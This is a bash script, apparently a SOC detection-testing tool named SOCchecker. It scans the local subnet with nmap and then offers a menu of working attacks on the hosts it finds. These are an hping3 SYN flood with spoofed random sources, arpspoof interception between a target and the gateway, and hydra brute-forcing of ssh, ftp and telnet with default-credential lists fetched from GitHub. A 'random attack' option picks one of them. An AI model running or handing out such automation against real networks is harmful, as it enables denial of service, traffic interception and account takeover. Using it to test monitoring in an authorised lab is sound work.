#!/bin/bash 

# Get the current epoch time and date
ET=$(date +%s)
DATE=$(date +"%d-%m-%Y %H:%M:%S")
cd /var/log

# Check if the directory SOCchecker does not exist, create it and set permissions
if [ ! -d "SOCchecker" ]; then
    sudo mkdir "SOCchecker"
    sudo chmod a+rw "SOCchecker"
fi

cd SOCchecker
MDIR=$(pwd)

# Create a directory with the epoch time and set permissions
mkdir $ET
sudo chmod a+rw $ET
cd $ET

# Create directories Preliminaryscans and logs
mkdir Preliminaryscans
mkdir logs
HOME=$(pwd)

# Create a directory for HydraLists and set permissions
mkdir -p ${MDIR}/HydraLists
chmod a+rw ${MDIR}/HydraLists

# Get the local IP address and network range
LOCAL_IP=$(hostname -I | awk '{print $1}')
NET_RANGE=$(ipcalc $LOCAL_IP | grep Network: | awk '{print $2}')

# Define text formatting for console output
bold=$(tput bold)
normal=$(tput sgr0)

# Function to display start information
START()
{
    echo ""
    echo "[+]Epoch time: ${bold}$ET"${normal}
    echo "[+] local ip address - ${bold}$LOCAL_IP"${normal}
    echo "[+] Network ip range - ${bold}$NET_RANGE"${normal}
    echo ""
}

DEPENDENCIES()
{
    # Check if nmap is installed
    if ! command -v nmap &> /dev/null; then
        missing_tools+=("nmap")
    fi

    # Check if arpspoof is installed
    if ! command -v arpspoof &> /dev/null; then
        missing_tools+=("arpspoof")
    fi

    # Check if tshark is installed
    if ! command -v tshark &> /dev/null; then
        missing_tools+=("tshark")
    fi
    
    # Check if hydra is installed
    if ! command -v hydra &> /dev/null; then
        missing_tools+=("hydra")
    fi

    # Check if hping3 is installed
    if ! command -v hping3 &> /dev/null; then
        missing_tools+=("hping3")
    fi
    
    # If any tools are missing alert the user and install them
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo "[-] The following tools are missing: ${missing_tools[@]}"
        
        read -p "Do you want to install them? (y/n): " choice

        case "$choice" in
            [Yy])
                # Install the missing tools using apt-get
                sudo apt-get update
                sudo apt-get install "${missing_tools[@]}"
                ;;
            [Nn])
                echo "You chose not to install the missing tools. Exiting."
                exit 1
                ;;
            *)
                echo "Invalid choice. Exiting."
                exit 1
                ;;
        esac
    else
        echo "[+] All required tools are installed."
        echo ""
    fi
}

PRESCAN()
{

    echo ""

    # Run a preliminary nmap scan and export results
    sudo nmap -Pn $NET_RANGE -oN ${HOME}/Preliminaryscans/${ET}_NMAP_PrelimscanON.txt -oG ${HOME}/Preliminaryscans/${ET}_NMAP_PrelimscanOG.txt > /dev/null 2>&1 &
    nmap_PID=$!


    echo "[+] Scanning $NET_RANGE..."
    wait $nmap_PID


    local INPUT_FILE="${HOME}/Preliminaryscans/${ET}_NMAP_PrelimscanON.txt"
    ATTACKLIST12=${HOME}/Preliminaryscans/ATTACKLIST12.txt

    # Extract information from the nmap scan and create attack lists
    awk '/Nmap scan report for/ { ip=$5 } /\/tcp.*open/ { port=$1; gsub("/tcp", "", port); print ip, port }' "$INPUT_FILE" > "$ATTACKLIST12"
    cat ${ATTACKLIST12} | awk '{print $1} ' > ${HOME}/Preliminaryscans/ATTACKLIST1.txt
    ATTACKLIST1=${HOME}/Preliminaryscans/ATTACKLIST1.txt
    cat ${ATTACKLIST12} | awk '{print $2} ' > ${HOME}/Preliminaryscans/ATTACKLIST2.txt
    ATTACKLIST2=${HOME}/Preliminaryscans/ATTACKLIST2.txt
    HYDRAIPLIST=${HOME}/Preliminaryscans/Hydraiplist.txt

    # Extract specific services from the nmap scan and create Hydra list
    cat "$ATTACKLIST12" | awk '/Nmap scan report for/ { ip=$5 } /\/tcp.*open/ { port=$1; gsub("/tcp", "", port); service=$3; if (service == "ssh") print ip, port, service }' "$INPUT_FILE" | grep -i "ssh" >> ${HOME}/Preliminaryscans/Hydraiplist.txt
    cat "$ATTACKLIST12" | awk '/Nmap scan report for/ { ip=$5 } /\/tcp.*open/ { port=$1; gsub("/tcp", "", port); service=$3; if (service == "telnet") print ip, port, service }' "$INPUT_FILE" | grep -i "telnet" >> ${HOME}/Preliminaryscans/Hydraiplist.txt
    cat "$ATTACKLIST12" | awk '/Nmap scan report for/ { ip=$5 } /\/tcp.*open/ { port=$1; gsub("/tcp", "", port); service=$3; if (service == "ftp") print ip, port, service }' "$INPUT_FILE" | grep -i "ftp" >> ${HOME}/Preliminaryscans/Hydraiplist.txt
    cat "$ATTACKLIST12" | awk '/Nmap scan report for/ { ip=$5 } /\/tcp.*open/ { port=$1; gsub("/tcp", "", port); service=$3; if (service == "rpd") print ip, port, service }' "$INPUT_FILE" | grep -i "rdp" >> ${HOME}/Preliminaryscans/Hydraiplist.txt
    ARPIPLIST=${HOME}/Preliminaryscans/ARPiplist.txt

    # Extract ARP information from the nmap scan
    cat ${INPUT_FILE} | grep -B 1 -i "Host is up" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" > $ARPIPLIST


    echo ""
    echo "------------------------------------------------------------------"
    echo "${bold}[+] Preliminary scan completed ${normal}"
    echo "${bold}[+] IP attack list has been generated ${normal}"
    echo "${bold}[+] Attack list Location:  ${normal} $ATTACKLIST12"
    echo "${bold}[+] Full scan log location:  ${normal} ${HOME}/${ET}_prescan.txt"
    echo "------------------------------------------------------------------"
    echo ""


    MENU
}

MENU()
{

    exit=0


    while [ $exit -ne 1 ]
    do
        echo "${bold}Please select attack type:${normal}"
        echo "------------------------------------------------------------------"
        echo ""
        echo "1 - SYN flood attack"
        echo "2 - ARP spoofing"
        echo "3 - Brute force"
        echo "4 - Random attack"
        echo ""
        

        read menuoption;
        

        case $menuoption in 
            1)
                echo ""
                echo "Selected SYN flood attack"
                echo "Using hping3, this attack attempts to flood the target with TCP SYN packets"
                

                ATTACKTYPE=SYNFLOOD
                IPATTACKMENU
                ;;
            
            2)
                echo ""
                echo "Selected ARP spoofing"
                echo "Using arpspoof, this attack sends forged ARP replies to the target's system"
                

                ARPSPOOFMENU
                ;;
            
            3)
                echo ""
                echo "Selected Brute force"
                echo "Using hydra, this attack will try and brute force available ports"
                

                HYDRASSH
                ;;
            
            4)
                echo ""
                echo "Random attack"
                

                RANDOMATTACK
                ;;
            
            *)
                echo ""
                echo "Wrong input, aborting." && exit=1 
                ;;
        esac
    done
}

RANDOMATTACK() 
{
    # Generate a random number between 1 and 3
    RANDOMFUNCTION=$((1 + RANDOM % 3))


    case $RANDOMFUNCTION in
        1)
            echo "Selected SYN flood attack"
            ATTACKTYPE=SYNFLOOD
            IPATTACKMENU
            ;;
        2)
            echo "Selected ARP spoofing"
            ARPSPOOFMENU
            ;;
        3)
            echo "Selected Brute force"
            HYDRASSH
            ;;
        *)
            echo "Invalid random number"
            ;;
    esac
}

IPATTACKMENU()
{

    exit=0


    while [ $exit -ne 1 ]
    do
        echo ""
        echo "choose (1-4):"
        echo "------------------------------------------------------------------"
        
        echo "1) Use a random IP from the existing socchecker attack list"
        echo "2) Manually Enter IP"
        echo "3) Create attack list"
        echo "4) Select IP from the list"
        echo ""
        
        # Read user input for IP attack menu option
        read ipmenu
        case $ipmenu in
            1) ATTACKRANDOMIP
               ;;
            2) MANUALLIP
               ;;
            3) PRESCAN 
               ;;
            4) echo "------------------------------------------------------------------"
               IPLIST
               ;;
            *) echo "[-] Wrong input, aborting." && exit=1 
               ;;
        esac
    done
}

ATTACKRANDOMIP()
{
    # Check if the attack list file exists
    if [ ! -f "${HOME}/Preliminaryscans/ATTACKLIST12.txt" ]; then
        echo "[-] Can't find SOCchecker attack list"
        MENU
    else 
        # Select a random IP from the attack list
        RANDOM_IP=$(shuf -n 1 "$ATTACKLIST12")
        echo "Random target: $RANDOM_IP"
        CHOICE1=$(echo "$RANDOM_IP" | awk '{ print $1 }')
        CHOICE2=$(echo "$RANDOM_IP" | awk '{ print $2 }')
        

        $ATTACKTYPE

        exit 1
    fi
}

MANUALLIP()
{
    # ask user to enter target IP and port manually
    echo "[+] Enter target IP:"
    read CHOICE1
    echo ""
    echo "Enter target port:"
    read CHOICE2
    echo "[+] Selected target - $CHOICE1 $CHOICE2"
    echo ""
    

    $ATTACKTYPE
}


IPLIST()
{
    # ask the user to select a target IP
    echo "Select Target IP:"
    OPTIONS1=($(< <(cat "$ATTACKLIST1" | sort -n | uniq | sort -n)))

    select CHOICE1 in "${OPTIONS1[@]}"; do
        if [ "$CHOICE1" ]; then
            echo "[+] Target IP - $CHOICE1"
            echo ""

            # ask the user to select a target port based on the chosen IP
            echo "Select target port:"
            OPTIONS2=($(< <(cat "$ATTACKLIST12" | grep "$CHOICE1" | awk '{ print $2 }')))

            select CHOICE2 in "${OPTIONS2[@]}"; do
                if [ "$CHOICE2" ]; then

                    $ATTACKTYPE
                    :
                else
                    echo "[-] Invalid selection. Exiting." && exit 1
                fi
            done
        else
            echo "[-] Invalid selection. Exiting." && exit 1
        fi
    done
}

SYNFLOOD()
{
    # Log information 
    echo "SYN flood" >> ${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt
    date +"%d-%m-%Y %H:%M:%S" >> ${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt
    echo "$(date +%s)" >> ${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt
    echo >> ${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt
    echo "[+] Selected target $CHOICE1 $CHOICE2" >> ${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt

    # Display information about the selected target and start the SYN flood attack
    echo "[+] Selected target $CHOICE1 $CHOICE2"
    echo "[+] Starting SYN flood attack!"
    sudo hping3 --data 120 --syn --flood --rand-source -a $CHOICE1 -P $CHOICE2 >> "${HOME}/logs/${CHOICE1}_${CHOICE2}_SYNflood.txt" 2>&1 >/dev/null &
    SYNFLOODPID=$!
    wait $SYNFLOODPID


    MENU
}

HYDRASSH()
{
    # Check if sshuserlist.txt and sshpasslist.txt files exist in HydraLists directory
    if [[ -f "${MDIR}/HydraLists/sshuserlist.txt" && -f "${MDIR}/HydraLists/sshpasslist.txt" ]]; then
        # Call HYDRAFTP function if files already exist
        HYDRAFTP
        return
    fi

    # Set maximum retry attempts
    max_retries=3
    retry_count=0

    # Loop to download ssh-betterdefaultpasslist.txt with retries
    while [ $retry_count -lt $max_retries ]; do
        # download the file
        if wget -P ${MDIR}/HydraLists https://github.com/danielmiessler/SecLists/raw/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt > /dev/null 2>&1; then
            PID=$!
            wait $PID
            echo "[+] ${bold}Downloaded ssh-betterdefaultpasslist.txt to ${MDIR}/HydraLists ${normal}"
            echo "[+] ${bold}Splitting to user and password list ${normal}"

            # Extract usernames and passwords and store them in separate files
            cat ${MDIR}/HydraLists/ssh-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $1}' > ${MDIR}/HydraLists/sshuserlist.txt
            cat ${MDIR}/HydraLists/ssh-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $2}' > ${MDIR}/HydraLists/sshpasslist.txt

            # Set files as variables
            SSHUSER=${MDIR}/HydraLists/sshuserlist.txt
            SSHPASS=${MDIR}/HydraLists/sshpasslist.txt

            # Reset retry count
            retry_count=0

            # Break out of the loop if successful
            break
        else
            ((retry_count++))
            echo "[-] ${bold}Error: Unable to download ssh-betterdefaultpasslist.txt. Retrying... (Attempt $retry_count)${normal}"
        fi
    done

    # Check if max retries reached
    if [ $retry_count -eq $max_retries ]; then
        echo "[-] ${bold}Error: Maximum number of retries reached. Exiting.${normal}"
        exit 1
    fi


    HYDRAFTP
}


HYDRAFTP()
{
    # Check if files exist
    if [[ -f "${MDIR}/HydraLists/ftpuserlist.txt" && -f "${MDIR}/HydraLists/ftppasslist.txt" ]]; then

        HYDRATN
        return
    fi

    # Set maximum retry attempts
    max_retries=3
    retry_count=0

    # Loop to download ftp-betterdefaultpasslist.txt with retries
    while [ $retry_count -lt $max_retries ]; do
        # download the file
        if wget -P ${MDIR}/HydraLists https://github.com/danielmiessler/SecLists/raw/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /dev/null 2>&1; then
            PID=$!
            wait $PID
            echo "[+] ${bold}Downloaded ftp-betterdefaultpasslist.txt to ${MDIR}/HydraLists ${normal}"
            echo "[+] ${bold}Splitting to user and password list ${normal}"

            # Extract usernames and passwords and store them in separate files
            cat ${MDIR}/HydraLists/ftp-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $1}' > ${MDIR}/HydraLists/ftpuserlist.txt
            cat ${MDIR}/HydraLists/ftp-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $2}' > ${MDIR}/HydraLists/ftppasslist.txt


            FTPUSER=${MDIR}/HydraLists/ftpuserlist.txt
            FTPPASS=${MDIR}/HydraLists/ftppasslist.txt

            # Reset retry count
            retry_count=0

            # Break out of the loop if successful
            break
        else
            ((retry_count++))
            echo "[-] ${bold}Error: Unable to download ftp-betterdefaultpasslist.txt. Retrying... (Attempt $retry_count) ${normal}"
        fi
    done

    # Check if max retries reached
    if [ $retry_count -eq $max_retries ]; then
        echo "[-] ${bold}Error: Maximum number of retries reached. Exiting. ${normal}"
        exit 1
    fi


    HYDRATN
}


HYDRATN()
{
    # Check if files exist
    if [[ -f "${MDIR}/HydraLists/tnuserlist.txt" && -f "${MDIR}/HydraLists/tnpasslist.txt" ]]; then

        HYDRAMENU
        return
    fi

    # Set maximum retry attempts
    max_retries=3
    retry_count=0

    # Loop to download telnet-betterdefaultpasslist.txt with retries
    while [ $retry_count -lt $max_retries ]; do
        # download the file
        if wget -P ${MDIR}/HydraLists https://github.com/danielmiessler/SecLists/raw/master/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt > /dev/null 2>&1; then
            PID=$!
            wait $PID
            echo "[+] ${bold}Downloaded telnet-betterdefaultpasslist.txt to ${MDIR}/HydraLists ${normal}"
            echo "[+] ${bold}Splitting to user and password list ${normal}"

            # Extract usernames and passwords and store them in separate files
            cat ${MDIR}/HydraLists/telnet-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $1}' > ${MDIR}/HydraLists/tnuserlist.txt
            cat ${MDIR}/HydraLists/telnet-betterdefaultpasslist.txt | sed 's/:/ /g' | awk '{print $2}' > ${MDIR}/HydraLists/tnpasslist.txt

            # Set variables
            TNUSER=${MDIR}/HydraLists/tnuserlist.txt
            echo "${MDIR}/HydraLists/tnuserlist.txt"
            echo "TNUSER $TNUSER"
            TNPASS=${MDIR}/HydraLists/tnpasslist.txt

            # Reset retry count
            retry_count=0

            # Break out of the loop if successful
            break
        else
            ((retry_count++))
            echo "[-] ${bold}Error: Unable to download telnet-betterdefaultpasslist.txt. Retrying... (Attempt $retry_count) ${normal}"
        fi
    done

    # Check if max retries reached
    if [ $retry_count -eq $max_retries ]; then
        echo "${bold}Error: Maximum number of retries reached. Exiting. ${normal}"
        exit 1
    fi


    HYDRAMENU
}

HYDRAMENU()
{

    echo ""
    echo "choose (1-2):"
    echo "------------------------------------------------------------------"
    echo "1) Use random IP from existing SOCchecker attack list"
    echo "2) Select IP from the list"
    echo ""


    read ipmenu
    case $ipmenu in

        1)
            # Choose a random IP from file
            local totalLines=$(wc -l < "$HYDRAIPLIST")
            local randomLineNumber=$((1 + RANDOM % totalLines))

            # Using sed to extract the randomly chosen line
            local randomLine=$(sed -n "${randomLineNumber}p" "$HYDRAIPLIST")

            echo "$randomLine"
            CHOICE1=$(echo "$randomLine" | awk '{ print $1 }')
            CHOICE2=$(echo "$randomLine" | awk '{ print $2 }')
            CHOICE3=$(echo "$randomLine" | awk '{ print $3 }')
            echo "choice1 $CHOICE1"
            echo "choice2 $CHOICE2"
            echo "choice3 $CHOICE3"

            # Determine protocol and set USERLIST and PASSLIST variables accordingly
            case "$CHOICE3" in
                telnet)
                    USERLIST="${MDIR}/HydraLists/tnuserlist.txt"
                
                    
                    PASSLIST=" ${MDIR}/HydraLists/tnpasslist.txt"
                 
                    ;;
                ssh)
                    USERLIST="${MDIR}/HydraLists/sshuserlist.txt"
                    PASSLIST="${MDIR}/HydraLists/sshpasslist.txt"
                    
                 
                    ;;
                ftp)
                    USERLIST="${MDIR}/HydraLists/ftpuserlist.txt"
                    PASSLIST="${MDIR}/HydraLists/ftppasslist.txt"
                
                    ;;
                *)
                    echo "[-] Unsupported protocol: $CHOICE3. Exiting." && exit 1
                    ;;
            esac


            HYDRA

            ;;
            
        2)
            # Select target IP
            echo "Select Target IP:"
            OPTIONS1=($(< <(cat "$HYDRAIPLIST" | awk '{ print $1 }' | sort -n | uniq | sort -n)))

            # ask user to choose a target
            select CHOICE1 in "${OPTIONS1[@]}"; do
                if [ "$CHOICE1" ]; then
                    echo "[+] Target IP - $CHOICE1"
                    echo ""

                    # Select target port based on the chosen IP
                    echo "Select target port:"
                    OPTIONS2=($(< <(cat "$HYDRAIPLIST" | grep "$CHOICE1" | awk '{ print $2 }')))

                    # Prompt user to choose a target port
                    select CHOICE2 in "${OPTIONS2[@]}"; do
                        if [ "$CHOICE2" ]; then
                            # Extract protocol based on the chosen IP and port
                            CHOICE3=$(grep "${CHOICE1} ${CHOICE2}" "$HYDRAIPLIST" | awk '{ print $3 }')
                            
                            
                            
                               # Determine protocol and set USERLIST and PASSLIST variables accordingly
								case "$CHOICE3" in
								telnet)
										USERLIST="${MDIR}/HydraLists/tnuserlist.txt"
                
                    
										PASSLIST=" ${MDIR}/HydraLists/tnpasslist.txt"
                 
										;;
								ssh)
										USERLIST="${MDIR}/HydraLists/sshuserlist.txt"
										PASSLIST="${MDIR}/HydraLists/sshpasslist.txt"
                    
                 
										;;
								ftp)
										USERLIST="${MDIR}/HydraLists/ftpuserlist.txt"
										PASSLIST="${MDIR}/HydraLists/ftppasslist.txt"
                
										;;
								*)
										echo "[-] Unsupported protocol: $CHOICE3. Exiting." && exit 1
										;;
								esac
                                                                                  
                            echo "$CHOICE1 $CHOICE2"
                            # Call the HYDRA function
                            HYDRA
                            :
                        else
                            echo "[-] Invalid selection. Please choose a valid option."
                        fi
                    done
                else
                    echo "[-] Invalid selection. Please choose a valid option."
                fi
            done

            ;;
        
        *)
            echo "[-] Wrong input, aborting." && exit 1

            ;;

    esac

}


HYDRA()
{

    echo "[+] Starting brute-force attack."

    # Run hydra with timeout, remove "timeout -k 5m 5m" to disable timeout.
    #echo "USERLIST $USERLIST"
    #echo "PASSLIST $PASSLIST"
    #echo "CHOICE2 $CHOICE2"
    #echo "CHOICE1 $CHOICE1"
    #echo "CHOICE3 $CHOICE3"
    timeout -k 5m 5m sudo hydra -L $USERLIST -P $PASSLIST -f -s $CHOICE2 -o $HOME/logs/${CHOICE1}_${CHOICE2}_${CHOICE3}_bruteforce.txt $CHOICE1 $CHOICE3 

    # Get the process ID of the hydra command
    HYDRAPID=$!

    # Wait for the hydra command to complete
    wait $HYDRAPID


    MENU
}

ARPSPOOFMENU()
{

    echo ""
    echo "choose (1-2):"
    echo "------------------------------------------------------------------"
    echo "1) Use a random IP from the existing SOCchecker attack list"
    echo "2) Select IP from the list"
    echo ""


    read ipmenu
    case $ipmenu in

        1)
            # Choose a random IP
            local CHOICE1=$(wc -l < "$ARPIPLIST")
            local randomLineNumber=$((1 + RANDOM % CHOICE1))

            # Using sed to extract the randomly chosen line
            local CHOICE1=$(sed -n "${randomLineNumber}p" "$ARPIPLIST")

            echo "$CHOICE1"

            ARPSPOOF

            ;;

        2)
            # Select target IP
            echo "Select Target IP:"
            OPTIONS1=($(< <(cat "$ARPIPLIST" | sort -n | uniq | sort -n)))

            # ask user to choose a target IP
            select CHOICE1 in "${OPTIONS1[@]}"; do
                if [ "$CHOICE1" ]; then
                    echo "[+] Target IP - $CHOICE1"
                    echo ""

                    ARPSPOOF
                else
                    echo "[-] Invalid selection. Please choose a valid option."
                fi
            done

            ;;

        *)
            echo "[-] Wrong input, aborting." && exit=1 

            ;;

    esac
}

ARPSPOOF()
{

    echo "arpspoof" >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt
    date +"%d-%m-%Y %H:%M:%S" >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt
    date +%s >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt

    # Get network interface
    INT="$(ip route get 8.8.8.8 | awk '/dev/ {print $5}')"

    # ask user to enter the network interface
    if [ -z "$INT" ]; then
        read -p "Enter the network interface (eth0, eth1, wlan0, etc.): " INT
    fi

    # Get the gateway IP address
    GATE=$(ip route show default | awk '/default/ {print $3}')

    # Display information
    echo "[+] Interface: ${INT} | Target: ${CHOICE1} | Gateway: ${GATE}"
    echo "[+] Starting ARP spoof attack!"

    # Log the arpspoof command
    echo "sudo arpspoof -i $INT -t $CHOICE1 $GATE" >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt
    echo >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt

    # Run arpspoof command in the background
    sudo arpspoof -i $INT -t $CHOICE1 $GATE >> ${HOME}/logs/${CHOICE1}_ARPspoof.txt 2>&1 &
    ARPSPOOFPID=$!

    # Wait for the arpspoof command to complete
    wait $ARPSPOOFPID


    MENU
}

# Initial setup and function calls
START
DEPENDENCIES
PRESCAN
